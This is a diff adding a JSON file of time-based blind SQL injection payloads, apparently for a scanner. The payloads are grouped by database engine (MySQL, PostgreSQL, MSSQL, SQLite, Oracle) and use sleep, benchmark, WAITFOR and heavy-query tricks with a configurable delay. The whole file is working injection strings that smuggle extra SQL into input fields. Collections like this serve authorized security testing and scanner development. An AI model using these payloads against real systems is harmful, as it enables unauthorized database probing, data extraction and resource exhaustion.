@@ -1,0 +1,44 @@
+{
+  "mysql": [
+    "' AND SLEEP({delay})-- -",
+    "' OR SLEEP({delay})-- -",
+    "\" AND SLEEP({delay})-- -",
+    "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- -",
+    "' AND BENCHMARK(10000000,SHA1('test'))-- -",
+    "')) AND SLEEP({delay})-- -",
+    "') AND SLEEP({delay})-- -",
+    "' AND (SELECT 1 FROM (SELECT(BENCHMARK(5000000,MD5('test'))))a)--",
+    "' AND (SELECT 1 FROM (SELECT(BENCHMARK(5000000,SHA1('test'))))a)--",
+    "' AND BENCHMARK(2000000,MD5(NOW()))--",
+    "' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)--",
+    "' /*!50000AND*/ /*!50000SLEEP({delay})*/--"
+  ],
+  "postgresql": [
+    "'; SELECT pg_sleep({delay})--",
+    "' AND (SELECT pg_sleep({delay}))::text='1'--",
+    "' OR (SELECT pg_sleep({delay}))::text='1'--",
+    "\" AND (SELECT pg_sleep({delay}))::text='1'--",
+    "')) AND (SELECT pg_sleep({delay}))::text='1'--",
+    "' AND (SELECT count(*) FROM generate_series(1,10000000))--",
+    "' AND (SELECT count(*) FROM generate_series(1,5000000))--",
+    "' AND (SELECT 1 FROM (SELECT count(*) FROM pg_catalog.pg_class a, pg_catalog.pg_class b)x)--"
+  ],
+  "mssql": [
+    "'; WAITFOR DELAY '0:0:{delay}'--",
+    "' AND 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:{delay}')a)--",
+    "'); WAITFOR DELAY '0:0:{delay}'--",
+    "\" ; WAITFOR DELAY '0:0:{delay}'--",
+    "'; WITH CTE(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM CTE WHERE n<1000000) SELECT count(*) FROM CTE OPTION(MAXRECURSION 0)--"
+  ],
+  "sqlite": [
+    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
+    "' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"
+  ],
+  "oracle": [
+    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
+    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
+    "\" AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
+    "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE DBMS_PIPE.RECEIVE_MESSAGE('a',0) END FROM dual)--",
+    "' AND (SELECT count(*) FROM all_objects a, all_objects b WHERE ROWNUM<=1000000)--"
+  ]
+}
